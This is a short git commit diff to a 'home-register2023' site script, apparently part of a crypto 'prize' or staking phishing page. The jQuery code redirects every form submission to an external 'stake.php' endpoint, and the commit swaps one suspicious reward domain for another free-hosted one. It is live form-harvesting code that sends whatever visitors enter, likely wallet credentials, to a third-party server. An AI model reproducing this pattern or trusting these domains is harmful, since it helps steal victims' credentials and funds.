3d5349057ed008ec3ee82472e7f1631863da45ff
CoreDaoPrize <126675788+CoreDaoPrize@users.noreply.github.com>
2023-03-01 20:48:57 +0700

    Update script.js

--- home-register2023/js/script.js
+++ home-register2023/js/script.js
@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://satoshi.infoprize-reward.site/stake.php");
+  $(myform).attr("action", "https://stakecoredao.epizy.com/stake.php");
 });
